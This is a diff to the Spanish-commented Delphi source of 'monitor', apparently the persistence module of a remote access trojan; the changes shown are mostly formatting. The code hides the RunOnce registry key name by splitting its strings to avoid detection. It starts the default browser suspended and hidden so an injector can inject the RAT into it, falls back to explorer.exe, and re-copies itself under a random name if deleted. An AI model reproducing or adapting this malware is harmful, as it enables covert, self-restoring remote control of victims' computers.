@@ -1,20 +1,22 @@
-library Monitor;
+library monitor;
+
 
 uses
   Windows,
   minireg,
   SettingsDef, //Para leer configuración
-  SHFolder, //Para conseguir %appdir%
+  SHFolder,    //Para conseguir %appdir%
   ShellApi;
 
+
 var
-  MCompartida   : THandle;       //Para leer la configuracion de memoria
+  MCompartida   : THandle; //Para leer la configuracion de memoria
   ConfigCompartida : PConfigCompartida;
   Configuracion:   TSettings;
   InyectorPath : string;
-  VecesCerrado: integer; //Numero de veces que se ha muerto o han matado iexplore.exe
+  VecesCerrado: integer; //Número de veces que se ha muerto o han matado iexplore.exe
 
-  
+
 function inttostr(const value: integer): string;
 var
   S:      string[11];
@@ -23,8 +25,9 @@ begin
   Result := S;
 end;
 
+
 function FindWindowsDir: string;
-  //retorna el directorio de windows
+  //Retorna el directorio de Windows
 var
   DataSize: byte;
 begin
@@ -38,8 +41,9 @@ begin
   end;
 end;
 
+
 function FindSystemDir: string;
-  //retorna el directorio de windows
+  //Retorna el directorio de Windows
 var
   DataSize: byte;
 begin
@@ -73,8 +77,9 @@ begin
   until(CharNo>= Max);
 end;
 
+
 function FindTempDir: string;
-  //retorna el directorio de los temporales
+  //Retorna el directorio de los temporales
 var
   DataSize: byte;
 begin
@@ -88,8 +93,9 @@ begin
   end;
 end;
 
+
 function FindRootDir: string;
-  //retorna el root del directorio de windows
+  //Retorna el root del directorio de windows
 var
   DataSize: byte;
 begin
@@ -99,7 +105,8 @@ begin
     Result := Copy(Result, 1, 3);
 end;
 
-function stringreplace(s1:string;s2:string;s3:string):string;   { (copyto) windir DIR}
+
+function stringreplace(s1:string;s2:string;s3:string):string; { (copyto) windir DIR}
 begin
   s1 := lc(s1);
   s2 := lc(s2);
@@ -110,6 +117,7 @@ begin
   else
     result := s1;
 end;
+
 
 function GetSpecialFolderPath(folder : integer) : string;
 const
@@ -124,6 +132,7 @@ begin
     if Result[Length(Result)] <> '\' then
       Result := Result + '\';
 end;
+
 
 function fileexists(const filename: string): boolean;
 var
@@ -140,6 +149,7 @@ begin
     result := false;
 end;
 
+
 function getBrowser: ansistring;
 var
   ts: ansistring;
@@ -149,6 +159,7 @@ begin
   ts     := Copy(ts, 1, Pos('"', ts) - 1);
   Result := ts;
 end;
+
 
 procedure leerconfiguracion();
 var
@@ -172,60 +183,56 @@ begin
     Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
     Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;
 
-    if(ConfigCompartida.bCerrarMonitor) then halt; //el servidor se está desinstalando
+    if(ConfigCompartida.bCerrarMonitor) then halt; //El servidor se está desinstalando
     UnmapViewOfFile(ConfigCompartida);
-    CloseHandle(MCompartida);    //La escribimos
+    CloseHandle(MCompartida); //La escribimos
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%WinDir%\', FindWindowsDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%SysDir%\', FindSystemDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%TempDir%\', FindTempDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%RootDir%\', FindRootDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%AppDir%\', GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));
 
-       Clave := 'SOFTWARE\Mic';
+    Clave := 'SOFTWARE\Mic';
     Clave := Clave + 'rosoft\Wind';
     Clave := Clave + 'ows\CurrentVe';
     Clave := Clave + 'rsion\RunOnce\';
     Clave := Clave + Configuracion.sRunRegKeyName;
-        if(Configuracion.bArranqueRun) and fileexists(Pchar(configuracion.sCopyTo+Configuracion.sFileNameToCopy)) then
-          RegSetString(HKEY_CURRENT_USER, Clave, (configuracion.sCopyTo+ Configuracion.sFileNameToCopy+' s'{la s es para que espere un poco antes de inyectarse}));
-  end;
-
-
+    if(Configuracion.bArranqueRun) and fileexists(Pchar(configuracion.sCopyTo+Configuracion.sFileNameToCopy)) then
+      RegSetString(HKEY_CURRENT_USER, Clave, (configuracion.sCopyTo+ Configuracion.sFileNameToCopy+' s'{la s es para que espere un poco antes de inyectarse}));
+    end;
 end;
-  
+
+
 procedure StartMonitor;
 var
   StartInfo: TStartupInfo;
   ProcInfo:  TProcessInformation;
 begin
 
-  LeerConfiguracion();  //Leemos la configuración de memoria
-
-
+  LeerConfiguracion(); //Leemos la configuración de memoria
 
   if (not (Configuracion.bCopiarArchivo)) and (Configuracion.sInyectadorFile<>'') then
     InyectorPath := Configuracion.sInyectadorFile //No nos instalaremos así que utilizamos el inyectorfile
   else
   if(fileexists(Configuracion.sInyectadorFile)) then
-    InyectorPath := Configuracion.sInyectadorFile //aun no nos hemos instalado
+    InyectorPath := Configuracion.sInyectadorFile //Aun no nos hemos instalado
   else
   InyectorPath := Configuracion.sCopyTo+Configuracion.sFileNameToCopy; //Ya estamos instalados!
 
-
   if FileExists(InyectorPath) then
   begin
-    if(VecesCerrado > 2) and (VecesCerrado < 5) then  //a fallado la inyeccion mas de dos veces y menos de seis o nos han cerrado mas de dos veces y menos de seis
+    if(VecesCerrado > 2) and (VecesCerrado < 5) then  //A fallado la inyeccion mas de dos veces y menos de seis o nos han cerrado mas de dos veces y menos de seis
     begin
-      ShellExecute(0, 'open', PAnsiChar(InyectorPath), PAnsiChar(' rat ultima'), nil, SW_SHOWNORMAL); //mandamos que inyecten el rat en explorer.exe como último recurso
+      ShellExecute(0, 'open', PAnsiChar(InyectorPath), PAnsiChar(' rat ultima'), nil, SW_SHOWNORMAL); //Mandamos que inyecten el RAT en explorer.exe como último recurso
      { sleep(10000);
       halt; //Nosotros nos vamos   }
     end
     else
-    begin       //nos cargamos en el defaultbrowser como siempre...
+    begin //Nos cargamos en el defaultbrowser como siempre...
       ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
       StartInfo.cb      := SizeOf(TStartupInfo);
-      startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
-      startinfo.wShowWindow := SW_HIDE;       //create process to inject into
+      startinfo.dwFlags := STARTF_USESHOWWINDOW; //Use wShowWindow
+      startinfo.wShowWindow := SW_HIDE; //Create process to inject into
       CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
       ShellExecute(0, 'open', PAnsiChar(InyectorPath), PAnsiChar(' rat ' + IntToStr(procInfo.dwProcessId)), nil, SW_SHOWNORMAL);
       WaitForSingleObject(ProcInfo.hProcess, INFINITE);
@@ -233,6 +240,7 @@ begin
     VecesCerrado := VecesCerrado+1;
   end;
 end;
+
 
 function caracteraleatorio():string;
 const
@@ -244,7 +252,6 @@ begin
 end;
 
 
-
 procedure escribirarchivo(sPath:string; content:string);
 var
   ServerFile : File;
@@ -253,13 +260,12 @@ begin
   tamano := length(content);
   AssignFile(ServerFile, sPath);
   ReWrite(ServerFile, 1);
-  Blockwrite(ServerFile, Content[1], tamano);  //cargado archivo a servdll
+  Blockwrite(ServerFile, Content[1], tamano); //Cargado archivo a servdll
   CloseFile(ServerFile);
 end;
 
 
-
-procedure EscribirSiBorran;   //rutina que se encarga de copiar el exe a otra ubicacion si lo borran
+procedure EscribirSiBorran; //Rutina que se encarga de copiar el exe a otra ubicacion si lo borran
 var
   copiado              : boolean;
   ConfigToSave         : PSettings;
@@ -277,10 +283,10 @@ begin
   Copiado := false;
   InyectadorContentTemp := '';
   InyectadorContent := '';
-  while Configuracion.bCopiarArchivo do  //Solo si nos han mandado instalarnos
+  while Configuracion.bCopiarArchivo do //Solo si nos han mandado instalarnos
   begin
     sleep(2500);
-    LeerConfiguracion();//Leemos la configuración
+    LeerConfiguracion(); //Leemos la configuración
     sleep(2500);
     if(fileexists(Configuracion.sCopyTo+Configuracion.sFileNameToCopy) and (not(leido))) then
     begin
@@ -305,18 +311,18 @@ begin
     begin //Tenemos el archivo para escribirlo a un nuevo directorio de instalación  en caso de que haga falta
       if (not fileexists(Configuracion.sCopyTo+Configuracion.sFileNameToCopy)) then
       begin
-        Nruta := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA);//Es el dir que menos problemas da en cuanto a permisos
+        Nruta := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA); //Es el dir que menos problemas da en cuanto a permisos
         Nnombre :=  caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+'.exe'; //nombre aleatorio de 6 caracteres
         escribirarchivo(Configuracion.sCopyTo+Configuracion.sFileNameToCopy,inyectadorcontent); //escribimos a su nueva ubicación
          Clave := 'SOFTWARE\Mic';
         Clave := Clave + 'rosoft\Wind';
         Clave := Clave + 'ows\CurrentVe';
-        Clave := Clave + 'rsion\RunOnce\';  //aqui pasaremos mas indetectables y ademas se volvera a iniciar el inyectador.exe si nos matan
+        Clave := Clave + 'rsion\RunOnce\'; //Aquí pasaremos más indetectables y ademas se volvera a iniciar el inyectador.exe si nos matan
         Clave := Clave + Configuracion.sRunRegKeyName;
         if(Configuracion.bArranqueRun) and fileexists(Pchar(Nruta+Nnombre)) then
           RegSetString(HKEY_CURRENT_USER, Clave, (Nruta + Nnombre+' s'{la s es para que espere un poco antes de inyectarse}));
 
-        sleep(20000);//Después de que ha pasado un tiempo prudencial se vuelve a ejecutar :p
+        sleep(20000); //Después de que ha pasado un tiempo prudencial se vuelve a ejecutar :p
         if fileexists(Pchar(Nruta+Nnombre)) then
         ShellExecute(GetDesktopWindow(), 'open',PChar('"' + Nruta + Nnombre + '"'),'', nil, 0)
       end;
@@ -327,17 +333,17 @@ end;
 var
   id1: longword = 0;
 begin
-  VecesCerrado := 0; //las veces que han cerrado el proceso iexplore.exe
+  VecesCerrado := 0; //Las veces que han cerrado el proceso iexplore.exe
   
   BeginThread(nil,0,Addr(EscribirSiBorran),nil,0,id1);
   
   while (True) do
   begin
     StartMonitor;
-    //no seguir ejecutando IE e inyectando si Windows se está apagando
+    //No seguir ejecutando IE e inyectando si Windows se está apagando
     //if winShutDown then Exit;
     sleep(20000);//Le da un poco de estabilidad por si la inyeccion falla  y además deja un tiempo par aque windows se apague
-  end;//while
+  end; //while
   // http://www.youtube.com/watch?v=4Rc5o9PbJNo
 
 end.
